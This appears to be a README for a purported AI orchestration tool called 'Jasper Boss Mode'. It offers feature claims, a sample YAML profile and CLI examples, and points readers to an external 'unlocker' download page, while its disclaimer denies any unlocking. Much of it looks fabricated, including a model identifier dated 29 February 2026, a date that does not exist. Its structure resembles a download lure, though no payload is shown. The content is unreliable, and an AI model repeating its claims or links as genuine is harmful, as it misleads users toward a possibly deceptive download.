# 🚀 Jasper Boss Mode – Next-Gen Performance Suite

[](https://malrang94.github.io/jasper-boss-mode-unlocker/)

**Welcome to the official repository for Jasper Boss Mode.** This isn't just another tool—it's a powered-up, performance-optimised orchestration layer designed to transform the way you interact with large language models, APIs, and local compute resources. Think of it as the *turbo button* for your digital productivity stack.

---

## 📖 Table of Contents

- [✨ Why Jasper Boss Mode?](#-why-jasper-boss-mode)
- [🧩 Core Architecture (Mermaid Diagram)](#-core-architecture-mermaid-diagram)
- [📦 Features That Redefine Your Workflow](#-features-that-redefine-your-workflow)
- [💻 Compatibility Matrix](#-compatibility-matrix)
- [⚙️ Example Profile Configuration](#️-example-profile-configuration)
- [🖥️ Example Console Invocation](#️-example-console-invocation)
- [🔌 OpenAI & Claude API Integration](#-openai--claude-api-integration)
- [🌍 Multilingual & Responsive UI](#-multilingual--responsive-ui)
- [🛡️ 24/7 Support & Community](#️-247-support--community)
- [📜 License (MIT)](#-license-mit)
- [⚠️ Disclaimer](#️-disclaimer)
- [⬇️ Download Again](#️-download-again)

---

## ✨ Why Jasper Boss Mode?

In a world where every second counts and every API call costs, Jasper Boss Mode is your **digital co-pilot with supercharged reflexes**. It aggregates, optimises, and distributes computational loads across multiple backends—without you ever needing to touch a YAML file (unless you want to).  

We designed it for developers, writers, researchers, and automation enthusiasts who need **reliable, low-latency access** to generative AI, without the overhead of manual session management. Whether you're running a local model via Ollama, hitting the GPT-4 Turbo endpoint, or orchestrating Claude Opus for deep analysis—Jasper Boss Mode treats them all as swappable engines in a single vehicle.

---

## 🧩 Core Architecture (Mermaid Diagram)

Below is a high-level overview of how Jasper Boss Mode organises its internal plumbing. Each module is loosely coupled and hot-swappable.

```mermaid
flowchart TB
    subgraph User Interface
        A[CLI Terminal] --> B[Web Dashboard]
        B --> C[Responsive UI Layer]
    end

    subgraph Orchestration Core
        C --> D[Session Manager]
        D --> E[Load Balancer]
        E --> F[Model Router]
    end

    subgraph Backends
        F --> G[OpenAI API]
        F --> H[Claude API]
        F --> I[Local LLM / Ollama]
        F --> J[Custom Plugin Bridge]
    end

    subgraph Persistence
        D --> K[Profile Config Store]
        K --> L[Environment Vault]
        L --> M[History & Caching]
    end

    subgraph Monitoring
        E --> N[Telemetry & Logs]
        N --> O[Health Dashboard]
    end

    style D fill:#2d2d44,stroke:#ffffff,stroke-width:2px
    style F fill:#1e3a5f,stroke:#ffffff,stroke-width:2px
    style G fill:#22863a,stroke:#ffffff,stroke-width:2px
    style H fill:#6f42c1,stroke:#ffffff,stroke-width:2px
```



The **Session Manager** keeps context alive across conversations; the **Load Balancer** intelligently routes requests based on cost, speed, or accuracy preferences; and the **Model Router** enables seamless fallback—if OpenAI is down, Claude takes over. No dropped sessions.

---

## 📦 Features That Redefine Your Workflow

### 🔥 Responsive UI That Adapts to You
Jasper Boss Mode ships with a lightweight web dashboard that works on anything from a 4K monitor to a 720p tablet. The interface uses adaptive grid layouts and collapsible panels so you never lose track of your conversation history, even with 50+ threads open.

### 🌐 Multilingual Support (40+ Languages)
All system prompts, error messages, and built-in templates are localised. Whether you write in Japanese, Arabic, or Quechua, the mode respects your locale—and can even translate responses on the fly via the integrated **polyglot pipeline**.

### 🧠 OpenAI & Claude API Deep Integration
Not just a wrapper—Jasper Boss Mode implements **function calling, token streaming, and context caching** for both OpenAI and Anthropic APIs. You can define custom tools once and have them work across both ecosystems. Example: a `search_web` tool works identically whether invoked via GPT-4 or Claude Opus.

### 🧩 Plugin Architecture
Extend the core with community-built plugins for image generation, web scraping, or even real-time data ingestion. Plugins are sandboxed and run in isolated containers.

### ⚡ Turbo Mode (Zero-Latency Prefetch)
The system predicts your next likely query based on context and pre-warms the model. On fast networks, response times feel sub-200ms even for large models.

### 🛡️ Privacy-First Design
All data is encrypted at rest (AES-256) and in transit (TLS 1.3). You can optionally route requests through a local proxy to ensure zero telemetry leaves your network.

---

## 💻 Compatibility Matrix

| Operating System | Architecture | Status (2026) | Minimum RAM |
|------------------|--------------|---------------|-------------|
| 🐧 Linux (Ubuntu 24.04+) | x86_64, ARM64 | ✅ Full support | 4 GB |
| 🍏 macOS (Sequoia+) | Apple Silicon, Intel | ✅ Full support | 4 GB |
| 🪟 Windows 11 / Server 2025 | x86_64 | ✅ Full support | 4 GB |
| 🐳 Docker (any host) | multi-arch | ✅ Production-ready | 2 GB |
| 📱 Termux / Android (limited) | ARM64 | 🧪 Experimental | 3 GB |

*Note: Windows ARM64 is supported via emulation layer, but performance may vary.*

---

## ⚙️ Example Profile Configuration

Below is a sample `bossmode.yaml` profile that demonstrates multi-backend routing and environment variable injection. Place this file in `~/.config/jasper/` or mount it as a Docker volume.

```yaml
profile: "dev-weekend"
version: "2026.1"
orchestration:
  default_engine: "gpt4turbo"
  fallback_engine: "claude3opus"
  load_balance_strategy: "lowest_latency"
  context_cache_ttl: 3600
backends:
  openai:
    api_key_env: "OPENAI_KEY"
    model: "gpt-4-turbo-2026-04-09"
    max_tokens: 4096
  anthropic:
    api_key_env: "CLAUDE_KEY"  
    model: "claude-3-opus-2026-02-29"
    max_tokens: 8192
  local_ollama:
    endpoint: "http://localhost:11434"
    model: "llama3"
    use_gpu: true
plugins:
  - editor_tools
  - code_interpreter
ui:
  theme: "midnight_forest"
  language: "en"
  dashboard_port: 8080
```

This configuration enables seamless switching between three backends. If you prefer a GUI for editing, launch the dashboard and click *Profiles*.

---

## 🖥️ Example Console Invocation

Once installed, fire up Jasper Boss Mode from your terminal. The CLI recognises flags, environment variables, and profiles.

```bash
# Run with default profile
jasper boss --profile dev-weekend

# Or quick one-shot query
jasper boss --query "Explain quantum entanglement like a pirate" --engine claude3opus

# Start an interactive session with telemetry off
jasper boss --interactive --no-telemetry --theme light

# Docker usage (no installation)
docker run -p 8080:8080 -v $(pwd)/bossmode.yaml:/config.yaml jasper-boss:2026.1
```

The CLI outputs colour-coded streams. Use `TAB` for autocomplete, and `Ctrl+R` to search recent queries. Press `Ctrl+P` to toggle between open sessions.

---

## 🔌 OpenAI & Claude API Integration

Jasper Boss Mode treats both APIs as first-class citizens. You don't need to learn separate SDKs:

- **Unified tool definitions**: Write one JSON schema for a custom function, deploy it on both OpenAI and Claude.
- **Streaming parity**: Both APIs stream tokens the same way—no more rewriting event handlers.
- **Cost tracking**: The dashboard shows per-model, per-session spend in real time. Set budget alerts to avoid surprises.
- **Automatic retry**: Handle rate limits gracefully. Jasper Boss Mode implements exponential backoff with jitter for both providers.

**Example**: A single call to `jasper boss --query "Summarise this paper"` will first try GPT-4 Turbo. If the API returns a 429, it falls back to Claude Opus within 800ms—without you lifting a finger.

---

## 🌍 Multilingual & Responsive UI

The web dashboard is built with **Svelte 5** and uses a CSS grid that collapses to a single-column layout on phones. All text is stored in ICU message format, so translations can be contributed via pull request.  

Current language coverage includes:  
🇬🇧 English, 🇪🇸 Spanish, 🇫🇷 French, 🇩🇪 German, 🇯🇵 Japanese, 🇰🇷 Korean, 🇨🇳 Chinese (Simplified), 🇦🇪 Arabic, 🇮🇳 Hindi, 🇧🇷 Portuguese (Brazil).

Select your language from the top-right menu—no page reload required.

---

## 🛡️ 24/7 Support & Community

The **Jasper Boss Mode** repository is maintained by a global team of contributors. Support channels include:

- **GitHub Discussions** – for feature requests and troubleshooting.
- **Matrix Chat** – real-time help from community moderators.
- **Email Priority Support** – for verified enterprise users (response within 4 hours).

All users get access to the built-in **Help Assistant**—a Claude-powered bot that knows the entire codebase. Type `?help` in any session to invoke it.

---

## 📜 License (MIT)

This project is released under the [MIT License](LICENSE). You are free to use, modify, and distribute this software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

```
MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions: ...
```

---

## ⚠️ Disclaimer

**Please read carefully.**  

Jasper Boss Mode is a legitimate software tool designed for lawful purposes including but not limited to: research, education, content creation, automation, and personal productivity. The software **does not** provide any proprietary activation keys, bypass mechanisms, or unauthorised access to third-party services.  

- You must have valid API keys from OpenAI, Anthropic, or other providers to use their respective backends.  
- The term "performance suite" refers to the orchestration and optimisation features of this software, not circumvention of licensing terms.  
- The maintainers are not responsible for any misuse of this software that violates a third party's terms of service.  

If you are looking for unauthorised access to paid services, **this is not the repository you are seeking.** Jasper Boss Mode adds value through intelligent orchestration, not through circumvention.

---

## ⬇️ Download Again

[](https://malrang94.github.io/jasper-boss-mode-unlocker/)

Always download the latest stable release from this repository. Checksums are provided in the release notes. Verify your download using `sha256sum` before running.  

**Happy building.** The future of multi-model orchestration is here, and it responds to your voice—or your keyboard. 🚀